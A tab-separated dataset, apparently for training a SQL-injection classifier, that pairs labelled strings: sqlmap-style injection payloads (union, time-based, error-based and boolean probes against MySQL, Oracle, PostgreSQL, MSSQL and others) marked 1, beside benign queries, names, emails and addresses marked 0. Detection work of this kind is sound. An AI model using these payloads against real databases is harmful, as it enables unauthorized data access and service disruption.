payload	label
SELECT * FROM fifth WHERE essential = 'well'	0
veronese@prestigecars.tv	0
"-6478""   )    )    union all select 7087,7087,7087,7087,7087,7087,7087,7087--"	1
select case when 7634  =  3954 then 1 else null end--	1
1'  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
"1""   )    )     )   and sleep  (  5  )  #"	1
1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'gxpr'  =  'gxpr	1
-2190'  )   where 8890  =  8890 union all select 8890,8890#	1
SELECT * FROM worry WHERE engine BETWEEN 'struggle' AND 'activity'	0
-2120'  )   or 8734  =  8844#	1
raudres	0
6748550000000000	0
16646	0
1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   	1
char%4039%41%2b%40SELECT	1
8547	0
SELECT land ( s )  FROM knife SELECT forest ( s ) 	0
SELECT nearest ( s )  FROM cage SELECT eight ( s ) 	0
1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'aumk' like 'aumk	1
tandy	0
26292	0
SELECT * FROM noun FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM noted	0
SELECT column1 , column2, ... FROM table_name ;	0
"1%""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #"	1
-9700'  )   or 8811  =  7862	1
swearing	0
franks.merayo@karldeux.ki	0
balcells parets	0
1'  )   where 6387  =  6387 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
ajmet	0
SELECT TOP 3 * FROM prove WHERE south = 'early'	0
"1"" where 6501  =  6501"	1
-8054'   )    )    union all select 5232,5232,5232,5232,5232,5232,5232#	1
03nte99era	0
1   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
SELECT * FROM pool FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM peace	0
1%'  )   union all select null,null,null,null,null,null,null,null,null,null--	1
carteado	0
1%' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and '%'  =  '	1
   SELECT Employees.one, COUNT ( Orders.wolfID )  AS signFROM    ( OrdersINNER JOIN tent ON Orders.exampleID  =  Employees.lastID ) 	0
SELECT * FROM book WHERE what = 'egg' LIMIT 3	0
5756	0
1' and elt  (  1210  =  1210,sleep  (  5   )    )   	1
camio canexa 161 11?g	0
SELECT certainly ( s FROM hurt RIGHT JOIN	0
1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --	1
SELECT * FROM  ( SELECT gift FROM behind ) 	0
SELECT AVG ( exchange ) FROM division SELECT SUM ( suit ) 	0
   SELECT guide, troops, condition FROM crew WHERE piece  IS NULL	0
1 where 1636  =  1636 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --	1
SELECT * FROM flat 3	0
SELECT * FROM list WHERE operation = 'search' LIMIT 3	0
SELECT * FROM surface WHERE lot = 'beside'  OR involved = 'common'	0
"-5187""  )   union all select 3373,3373#"	1
quinn	0
  SELECT becameID AS ID, common AS shoe FROM now	0
1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'hllf'  =  'hllf	1
re681g48rdia	0
1 where 1576  =  1576	1
SELECT * FROM voice WHERE production BETWEEN '1996-07-01' AND '1996-07-31'	0
1'||  (  select 'drna' from dual where 5082  =  5082 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  ||'	1
SELECT dish ( s )  FROM bread UNION ALL	0
"-9944""   )    )    or 8537  =  2039 and    (    (   ""kfzj""  =  ""kfzj"	1
  SELECT coffee AS sun, coast AS [already]  FROM ruler	0
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1"	1
1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  4959  =  4959	1
cella	0
1'||  (  select 'jmao' where 3009  =  3009	1
"-4686""  )   as dxks where 7123  =  7123 or elt  (  1032  =  1032,3623  )  --"	1
-5425 where 5933  =  5933 union all select 5933,5933,5933--	1
   SELECT Employees.bound, COUNT ( Orders.thirdID )  AS mineralsFROM    ( OrdersINNER JOIN off ON Orders.theeID  =  Employees.minuteID ) 	0
SELECT listen ( s )  FROM courage SELECT eaten FROM his	0
 select * from users where id  =  1 *\ union select null,@@VERSION -- 1	1
end and    (    (     (  'xzbk'  =  'xzbk	1
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- knpw	1
afijacin	0
1'   )    )    and 4650  =  1322#	1
1'   )    )    as mjps where 2179  =  2179 union all select null,null,null,null,null,null,null--	1
"-3525"" where 3522  =  3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#"	1
"1%""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""%""  =  """	1
1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) 	1
1  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
duo_davalos@designworld.cz	0
  UPDATE until SET column =  'attached', City =  'coat' WHERE rather =  wing	0
FROM  ( SELECT DISTINCT string FROM excellent ) 	0
pertusa boladera	0
40542	0
select   (  case when   (  9299  =  2760  )   then 1 else 9299*  (  select 9299 from master..sysdatabases  )   end  )  --	1
prell@davidymamen.tc	0
1 where 6304  =  6304	1
dyck	0
SELECT * FROM club FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM rocket	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9053 )  ORDER BY meta_id ASC	0
SELECT rose ( s FROM glass RIGHT JOIN	0
25140	0
  SELECT islandID AS ID, skin AS because FROM thousand	0
-2333' union all select 9714,9714,9714--	1
1'  )   and 1987  =  3756#	1
 select * from users where id  =  1 union select @||1,version  (    )   -- 1	1
1'+  (  select nzij where 5456  =  5456 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   +'	1
1'+  (  select ummn where 8883  =  8883 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +'	1
 )    )    or sleep  (  __TIME__  )    =  '	1
1  )   as mnyy where 4409  =  4409 union all select null,null,null,null--	1
"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""eslo"" like ""eslo"	1
abrams.peabody@hojadecalculo.com.py	0
DELETE FROM herd WHERE mine = 'bush'	0
 SELECT DISTINCT column1 , column2, ... FROM table_name ;	0
43790	0
SELECT * FROM exciting WHERE region IN  ( SELECT stuck FROM appropriate ) 	0
   SELECT full, leg, lovelyFROM cause WHERE fastened  IS NOT NULL	0
pobla tornesa, la	0
1 and 5934  =  7745	1
ergasto	0
1  )   where 1559  =  1559 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --	1
deyecta	0
1' where 8430  =  8430 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
SELECT AVG ( public ) FROM gasoline	0
1'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --	1
SELECT * FROM then WHERE fell = 'eat'	0
28660	0
SELECT search ( s )  FROM he UNION ALL	0
SELECT * FROM breeze WHERE accept = 'pet'  OR out = 'gave'	0
SELECT AVG ( Price ) FROM whale	0
1  )   and sleep  (  5  ) 	1
 UPDATE duty SET pocket = 'closely'WHERE product = 'press'	0
INSERT INTO pressure ( giving, prize, powder, mail, work, common )  VALUES  ( 'chosen', 'roll'. characteristic', 'somebody', 'soon', 'before', 'rest' )  	0
43785	0
SELECT * FROM guard WHERE noted = 'sentence'  AND  ( did = 'fish' OR start = 'page' ) 	0
petrie3@menorca.com.kp	0
-5500'  )   order by 1--	1
1'   )    )    waitfor delay '0:0:5'--	1
1' and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --	1
ganoza	0
-4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#	1
1   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  3950  =  3950	1
SELECT useful FROM warn	0
SELECT COUNT ( machinery ) FROM unknown	0
   SELECT COUNT ( immediately ) , policeman FROM length BY seldom	0
54430634f	0
 SELECT * FROM suggest ORDER BY bark, branch	0
1' where 3188  =  3188 and 9198  =  9198--	1
SELECT curious ( s )  FROM pencil	0
laga_rtijo	0
"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw"	1
SELECT TOP 50 PERCENT * FROM shallow	0
select sleep  (  5  )   and   (  'hhlq' like 'hhlq	1
 or user like '%	1
SELECT were ( s ) FROM potatoes INNER JOIN	0
-4351'  )   or 6525  =  9458	1
SELECT * FROM fruit WHERE NOT recall = 'wheel'  AND NOT breathing = 'team'	0
DELETE FROM solution	0
SELECT paragraph ( s FROM fourth RIGHT JOIN	0
"  SELECT MID ( ""SQL Tutorial"", -5, 5 )  AS ExtractString;"	0
   SELECT fastened, curious+ ', ' + after+ ' ' + hole+ ', ' + jungle AS safety  FROM hold	0
SELECT satisfied ( s )  FROM library SELECT get FROM fence	0
 SELECT * FROM seems ORDER BY feathers, wave	0
SELECT AVG ( Price ) FROM chief	0
SELECT * FROM boy WHERE evidence = 'grade'	0
1'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'vtno'  =  'vtno	1
SELECT thread ( s )  FROM whom UNION ALL	0
hoste ustrell	0
1 union all select null,null,null,null,null,null,null,null#	1
SELECT * FROM floor WHERE its LIKE '%careful%'	0
"1"" where 7631  =  7631 and 4733  =  3439"	1
solar	0
-5288'  )   or make_set  (  1164  =  1710,1710  )   and   (  'pkwy'  =  'pkwy	1
-1370'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'xmrg'  =  'xmrg	1
1'   )    )    union all select null,null#	1
6552400000000000	0
SELECT morning ( s FROM skin RIGHT JOIN	0
SELECT AVG ( shop ) FROM yes SELECT SUM ( front ) 	0
SELECT * FROM hide WHERE secret = 'careful' FETCH FIRST 3 ROWS ONLY	0
SELECT shade ( s )  FROM yard	0
benajas rodrguez	0
SELECT * FROM charge WHERE vessels BETWEEN property09/01/1996hearing AND coffee15/31/1996year	0
SELECT TOP 50 PERCENT * FROM shut SELECT * FROM general FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM three	0
47361	0
SELECT * FROM composition ORDER BY enough	0
-3633'  )   where 3513  =  3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#	1
8739	0
SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c828cc7449' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1	0
-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--	1
baily	0
SELECT * FROM nearer WHERE NOT useful = 'sold'  AND NOT example = 'circle'	0
 select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1	1
select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--	1
pinela	0
SELECT AVG ( tired ) FROM worker SELECT SUM ( rocket ) 	0
   SELECT COUNT ( whispered ) , immediately FROM word BY thousand	0
1 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
c/ francia-urb.s.nicolas 171	0
kai-larsen-picchio6@multasdetransito.net	0
1'   )    )     )   union all select null,null,null,null,null#	1
212404000000000	0
-1620   )    )    union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--	1
7728	0
"-1588%""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #"	1
1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'zcey'  =  'zcey	1
-5420'  )   union all select 2508,2508,2508,2508,2508,2508,2508#	1
SELECT globe ( s )  FROM shirt UNION ALL	0
kiam	0
incom1a5abl8mente	0
1'   )    )    as dcen where 5852  =  5852 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --	1
SELECT * FROM hold WHERE Price NOT BETWEEN 10 AND 20	0
59di51ca1	0
45908	0
"-6381%"" or 8571  =  8571--"	1
1 where 1299  =  1299	1
SELECT AVG ( funny ) FROM early SELECT SUM ( monkey ) 	0
c96reveidil5	0
c/ xeixa, 189 8?d	0
1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'zpyx'  =  'zpyx	1
1%'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  '%'  =  '	1
SELECT AVG ( buy ) FROM pocket	0
"SELECT * FROM tired WHERE strong BETWEEN ""keep"" AND    ""difficult"""	0
  SELECT cat,pour,bark FROM father LEFT JOIN Orders ON changing.becauseID =  fast.steep ORDER BY child.label	0
90179643r	0
1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#	1
1'  )   union all select null,null,null--	1
select   (  case when   (  7019  =  1998  )   then 7019 else 7019*  (  select 7019 from mysql.db  )   end  )  #	1
-4477'   )    )    union all select 8444,8444,8444,8444,8444,8444,8444,8444--	1
  UPDATE fair SET those =  'wore', City =  'ship' WHERE weak =  possibly	0
1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  	1
SELECT * FROM evidence WHERE then NOT LIKE 'memory%'	0
-6292  )   union all select 7499,7499,7499,7499,7499,7499,7499--	1
 select * from users where id  =  1<@.. union select 1,version  (    )   -- 1	1
-'	1
ornellas3@professionalhost.com.pro	0
1' in boolean mode  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  #	1
10300	0
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'izyf'  =  'izyf	1
1'   )    )    as xntz where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --	1
1'  )   as rvli where 4427  =  4427	1
"1""  )   and 8677  =  9054#"	1
1'||  (  select 'ldad' where 6146  =  6146 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  ||'	1
iracema	0
SELECT TOP 3 * FROM health WHERE somewhere = 'coal' SELECT * FROM fell	0
c/ virgen de la paloma, 107	0
" select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1"	1
" select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1"	1
vies canales	0
1'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'zfrs'  =  'zfrs	1
SELECT * FROM bridge	0
SELECT * FROM compound FETCH FIRST 3 ROWS ONLY	0
SELECT DISTINCT compass FROM bell	0
plza. leire, 1, 6?a	0
-7371'  )   union all select 4531,4531,4531#	1
SELECT * FROM office WHERE four IN  ( SELECT shelter FROM badly ) 	0
1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'yaje'  =  'yaje	1
SELECT DISTINCT cake FROM stopped	0
bordagorry	0
   SELECT rose, taste+ ', ' + money+ ' ' + stick+ ', ' + handsome AS disappear  FROM guard	0
SELECT * FROM star WHERE Price NOT BETWEEN 10 AND 20	0
SELECT * FROM solve	0
1   )    )    union all select null,null,null,null,null,null,null,null#	1
"-6431""   )    )    union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#"	1
masia can sang, 33	0
47131	0
-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#	1
 SELECT column_name ( s )  FROM rule,bat	0
1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062	1
chorrito bajo, 11	0
"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--"	1
1'  )   as ycsr where 2238  =  2238 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
hermanos gascon 141	0
  UPDATE dried SET swim =  'north', City =  'huge' WHERE flight =  saved	0
   SELECT lady, crack, discovery FROM grade WHERE captured  IS NULL	0
SELECT silent	0
 SELECT column_name ( s )  FROM cream,sit	0
1  )   as wust where 3884  =  3884 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
micr6pil8	0
1 and make_set  (  9542  =  8888,8888  )  -- idkn	1
m1n*6848	0
"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy"	1
SELECT * FROM particularly WHERE unless BETWEEN 'heavy' AND 'push'	0
SELECT TOP 3 * FROM production WHERE native = 'eat' SELECT * FROM orbit	0
1'+  (  select jley where 3581  =  3581 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #	1
1 where 4785  =  4785 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --	1
SELECT * FROM typical ORDER BY official	0
1  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  	1
1'  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
yecla	0
1'   )    )    as uuuk where 7234  =  7234 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --	1
"1""  )   where 2278  =  2278"	1
-5967 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # lhoh	1
vaquer gorigoitia	0
palomares, 2 11b	0
nufrago	0
-8359  )   where 4430  =  4430 or 6872  =  6872--	1
SELECT * FROM table1 WHERE condition ; INSERT INTO table2  (  column1 , column2 , column3 , ... )  	0
1' in boolean mode  )   union all select null#	1
1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   1476  =  1476	1
SELECT * FROM wp_posts WHERE ID  =  28620 LIMIT 1	0
2331	0
SELECT flag FROM directly UNION ALL SELECT combination FROM swim ORDER BY triangle	0
SELECT * FROM office  WHERE equator NOT LIKE '[still]%'	0
SELECT test ( s )  FROM open FULL OUTER JOIN	0
10200	0
1   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  4510  =  4510	1
-8636'   )    )     )   or 4301  =  7212--	1
matacandelas	0
1  )   rlike   (  select   (  case when   (  5477  =  7492  )   then 1 else 0x28 end   )    )    and   (  4427  =  4427	1
belonne santaella	0
SELECT main	0
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'inec'  =  'inec	1
"-5181""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""qofp""  =  ""qofp"	1
INSERT INTO exist  ( syllable, strength, behavior )  VALUES  ( 'specific', 'greater', 'vast' )  	0
-2782'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #	1
bizarro	0
SELECT MIN ( create )  AS rate FROM ago	0
armintario	0
tartarizar	0
1' where 8864  =  8864	1
randera	0
SELECT football ( s )  FROM read FULL OUTER JOIN	0
c/ moriles 91	0
9849	0
c/ alfara de algimia, 184	0
  SELECT Orders.againrID, Employees.might, Employees.religious FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fightID ORDER BY Orders.structureID	0
-9340  )   where 5462  =  5462 or 3038  =  3038	1
SELECT COUNT ( engineerID ) FROM sight	0
"1%""   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"	1
SELECT * FROM very WHERE fresh  BETWEEN 10 AND 20	0
SELECT * FROM bone FETCH FIRST 3 ROWS ONLY	0
63a5et5192	0
-5066'   )    )    union all select 9689,9689,9689,9689#	1
"1%""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""%""  =  """	1
"  SELECT QUARTER ( ""2017-06-15"" ) ;"	0
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1"	1
"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#"	1
-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--	1
SELECT TOP 3 * FROM wait WHERE electric = 'southern'	0
 UPDATE lift SET try = 'thin'WHERE occur = 'season'	0
0g83ma7ora	0
SELECT sight FROM nine UNION ALL SELECT knew FROM lie ORDER BY aside	0
SELECT AVG ( rice ) FROM car	0
"-7306"" or 2081  =  6847"	1
chabrat	0
SELECT * FROM believed WHERE impossible = 'pictured'  AND City = 'fair'	0
kale	0
br8c99ma4290	0
SELECT * FROM us 3	0
 UPDATE quick SET planning = 'under'WHERE another = 'of'	0
"-3461""   )    )    union all select 6342,6342,6342,6342,6342,6342#"	1
   SELECT laid, surface, universeFROM colony WHERE five  IS NOT NULL	0
inglis@baltasarsantos.vu	0
"1"" where 6325  =  6325 union all select null,null,null,null,null,null,null,null,null,null#"	1
select   (  case when   (  2830  =  7046  )   then 2830 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--	1
SELECT TOP 50 PERCENT * FROM engineer	0
  SELECT fallenID AS ID, certain AS stay FROM supply	0
SELECT * FROM being 3 SELECT * FROM closer	0
SELECT * FROM storm WHERE damage = 'married'  OR cattle = 'pipe'	0
"1""  )   where 6255  =  6255 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --"	1
zaca27	0
SELECT * FROM shot  WHERE break NOT LIKE '[plenty]%'	0
43595	0
4945470000000000	0
1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'eznq' like 'eznq	1
INSERT INTO lips  ( smaller, solve, musical )  VALUES  ( 'gate', 'doll', 'baseball' )  	0
1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --	1
1'  )   where 3450  =  3450 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --	1
cybolski.doumanian@cortinasartesol.bh	0
mccauley@autobuses-hibridos.ph	0
"1%""   )    )    union all select null,null,null,null,null,null#"	1
njar	0
SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9369 )  ORDER BY meta_id ASC	0
